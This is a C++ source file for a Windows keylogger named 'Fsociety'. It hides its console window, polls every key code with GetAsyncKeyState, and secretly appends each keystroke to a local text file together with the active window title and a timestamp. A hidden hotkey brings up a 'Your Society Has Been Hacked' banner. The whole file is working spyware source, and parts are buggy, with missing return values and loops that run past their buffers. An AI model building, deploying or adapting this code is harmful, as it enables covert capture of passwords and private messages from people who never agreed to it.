// Fsociety.cpp 
#define _WIN32_WINNT 0x0502
#include <iostream>
#include <time.h>
#include <Windows.h>
#include <fstream>

using namespace std;
void draw_logo(void);
int key_found(int);
int color(int);
int maiusc_act();
int alt_gr_act();
int get_window();
int assignment();
int comparison();
int create_string(char);
char stringtoprint[200];
int counter=0;
char wnd_title[256];
char wnd_title_now[256];
int main_window();
HANDLE hConsole=GetStdHandle(STD_OUTPUT_HANDLE);

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
    SetConsoleTitle("Fsociety");
    while (true)
    {
        for (int i = 0; i < 255; i++)
        {
            if (GetAsyncKeyState(i))
            {
                key_found(i);
            }
        }
        Sleep(170);//170
    }
}
int comparison()
{
	for (int i=0;i<=256;i++)
	{
		if(wnd_title_now[i]!=wnd_title[i])
		{
			return false;
		}
	}
}
int assignment()
{
	for (int i=0;i<=256;i++)
	{
		wnd_title_now[i]=wnd_title[i];
	}
}
int key_found(int i)
{
    if (i == 220)          //'\'
    {
    	if (maiusc_act()==true)
    	{
    		if (alt_gr_act()==true)
    		{
    			main_window();
			}
			else
			{
    			create_string(char(124));
    		}
		}
		else
		{
			create_string(char(92));
		}
        return 0;
    }
    else if (i==48)        //0
    {
        if (maiusc_act()==true)
    	{
    		create_string(char(61));
		}
		else
		{
			create_string(char(i));
		}
        return 0;
    }
    else if (i == 49)      //1
    {
        if (maiusc_act()==true)
    	{
    		create_string(char(33));
		}
		else
		{
			create_string(char(i));
		}
        return 0;
    }
    else if (i == 50)      //2
    {
        if (maiusc_act()==true)
    	{
    		create_string(char(34));
		}
		else
		{
			create_string(char(i));
		}
        return 0;
    }
    else if (i == 51)      //3
    {
        if (maiusc_act()==true)
    	{
    		create_string(char(156));
		}
		else
		{
			create_string(char(i));
		}
        return 0;
    }
    else if (i == 52)      //4
    {
        if (maiusc_act()==true)
    	{
    		create_string(char(36));
		}
		else
		{
			create_string(char(i));
		}
        return 0;
    }
    else if (i == 53)      //5
    {
        if (maiusc_act()==true)
    	{
    		create_string(char(37));
		}
		else
		{
			create_string(char(i));
		}
        return 0;
    }
    else if (i == 54)      //6
    {
        if (maiusc_act()==true)
    	{
    		create_string(char(38));
		}
		else
		{
			create_string(char(i));
		}
        return 0;
    }
    else if (i == 55)      //7
    {
        if (maiusc_act()==true)
    	{
    		create_string(char(47));
		}
		else
		{
			create_string(char(i));
		}
        return 0;
    }
    else if (i == 56)      //8
    {
        if (maiusc_act()==true)
    	{
    		create_string(char(40));
		}
		else
		{
			create_string(char(i));
		}
        return 0;
    }
    else if (i == 57)      //9
    {
        if (maiusc_act()==true)
    	{
    		create_string(char(41));
		}
		else
		{
			create_string(char(i));
		}
        return 0;
    }
    else if (i == 219)      //'
    {
        if (maiusc_act()==true)
    	{
    		create_string(char(63));
		}
		else
		{
			create_string(char(39));
		}
        return 0;
    }
    else if (i == 221)      //ì 94 222
    {
        if (maiusc_act()==true)
    	{
    		create_string(char(94));
		}
		else
		{
			create_string(char(222));
		}
        return 0;
    }
    else if ((i > 64) && (i < 91))   //a-z
    {
    	if ((maiusc_act()==true)||(GetKeyState(VK_CAPITAL)))
    	{}
    	else
    	{
    		i+=32;
		}
        create_string(char(i));
        return 0;
    }
    else if (i == 186)     //è 
    {
    	if((alt_gr_act()==true)&&(maiusc_act()==true))
		{
			create_string(char(123));
		}
        else if (maiusc_act()==true)
    	{
    		create_string(char(130));
		}
		else if (alt_gr_act()==true)
		{
			create_string(char(91));
		}
		else
		{
			create_string(char(138));
		}
        return 0;
    }
    else if (i == 187)     //+ 43
    {
    	if((alt_gr_act()==true)&&(maiusc_act()==true))
		{
			create_string(char(125));
		}
        else if (maiusc_act()==true)
    	{
    		create_string(char(42));
		}
		else if(alt_gr_act()==true)
		{
			create_string(char(93));
		}
		else
		{
			create_string(char(43));
		}
        return 0;
    }
    else if (i == 192)     //ò 149
    {
        if (maiusc_act()==true)
    	{
    		create_string(char(128));
		}
		else if(alt_gr_act()==true)
		{
			create_string(char(64));
		}
		else
		{
			create_string(char(149));
		}
        return 0;
    }
    else if (i == 222)     //à 133
    {
        if (maiusc_act()==true)
    	{
    		create_string(char(167));
		}
		else if(alt_gr_act()==true)
		{
			create_string(char(35));
		}
		else
		{
			create_string(char(133));
		}
        return 0;
    }
    else if (i == 191)     //ù 151
    {
        if (maiusc_act()==true)
    	{
    		create_string(char(245));
		}
		else
		{
			create_string(char(151));
		}
        return 0;
    }
    else if (i == 226)     //< 60
    {
        if (maiusc_act()==true)
    	{
    		create_string(char(62));
		}
		else
		{
			create_string(char(60));
		}
        return 0;
    }
    else if (i == 188)     //, 44
    {
        if (maiusc_act()==true)
    	{
    		create_string(char(59));
		}
		else
		{
			create_string(char(44));
		}
        return 0;
    }
    else if (i == 190)     //. 46
    {
        if (maiusc_act()==true)
    	{
    		create_string(char(58));
		}
		else
		{
			create_string(char(46));
		}
        return 0;
    }
    else if (i == 189)     //- 45
    {
        if (maiusc_act()==true)
    	{
    		create_string(char(95));
		}
		else
		{
			create_string(char(45));
		}
        return 0;
    }
    else if (i == 32)
    {
    	create_string(' ');
    	return 0;
	}
	else if (i == 13)
	{
		create_string('\n');
    	return 0;
	}
	else if (i == 8)
	{
		create_string('\b');
    	return 0;
	}
}
int maiusc_act()
{
	if ((GetAsyncKeyState(160))||(GetAsyncKeyState(161)))
    	{
    		return true;
		}
}
int alt_gr_act()
{
	if ((GetAsyncKeyState(17))&&(GetAsyncKeyState(18))&&(GetAsyncKeyState(162))&&(GetAsyncKeyState(165)))
	{
		return true;
	}
}
int create_string(char x)
{
	char wnd_title[256];
	counter+=1;
    ofstream myfile("example.txt",std::ios::in | std::ios::out | std::ios::ate);
	myfile << x;
	get_window();
   	if (comparison()==false)
   	{
   		time_t my_time=time(NULL);
   		assignment();
		myfile<<"\n"<<wnd_title_now<<" "<<ctime(&my_time)<<"\n";
	}
	myfile.close();
}
int get_window()
{
	HWND hwnd=GetForegroundWindow();
 	GetWindowText(hwnd,wnd_title,sizeof(wnd_title));
}
int main_window()
{
	ShowWindow(GetConsoleWindow(), SW_SHOW);
	SetWindowPos(GetConsoleWindow() ,0,0,0 ,640,790,0);
	draw_logo();
	cout << "\n\t      ------+<< ";
	color(4);
	cout << "Y";
	color(7);
	cout << "ouR ";
	color(4);
	cout <<"S";
	color(7);
	cout << "ocietY HaS BeeN ";
	color(4);
	cout <<"HackeD";
	color(7);
	cout <<" >>+------";
	cout << "\n\n{1}=";
	color(4);
	cout<<"Info";
	color(7);
	cout <<" \n\n{2}=";
	color(4);
	cout <<"Read all date";
	color(7);
	cout<<"\n\n{3}=";
	color(4);
	cout<<"Exit";
	while (true)
	{
		if (GetAsyncKeyState(49))    //1
		{
			
		}
		else if (GetAsyncKeyState(50))    //1
		{
			
		}
		else if (GetAsyncKeyState(51))    //1
		{
			ShowWindow(GetConsoleWindow(), SW_HIDE);
			system("CLS");
			break;
		}
	}
}
void draw_logo(void)
{
	color(4);
    cout << "    .o88o.";
    color(7);
	cout << "                              o8o                .\n";
	color(4);
    cout << "   888 `' ";
    color(7);
	cout << "                              `''              .o8 \n";
	color(4);
    cout << "  o888oo  ";
    color(7);
	cout << " .oooo.o  .ooooo.   .ooooo.  oooo   .ooooo.  .o888oo oooo    ooo \n";
	color(4);
    cout << "   888    ";
    color(7);
	cout << "d88(  '8 d88' `88b d88' `'Y8 `888  d88' `88b   888    `88.  .8'  \n";
	color(4);
    cout << "   888    ";
    color(7);
	cout << "`'Y88b.  888   888 888        888  888ooo888   888     `88..8'   \n";
	color(4);
    cout << "   888    ";
    color(7);
	cout << "o.  )88b 888   888 888   .o8  888  888    .o   888 .    `888'    \n";
	color(4);
    cout << "  o888o   ";
    color(7);
	cout << "8''888P' `Y8bod8P' `Y8bod8P' o888o `Y8bod8P'   '888'      d8'    \n";
    cout << "                                                               .o...P'     \n";
    cout << "                                                               `XER0'      \n";
}
int color(int x)
{
	SetConsoleTextAttribute(hConsole,x);
}
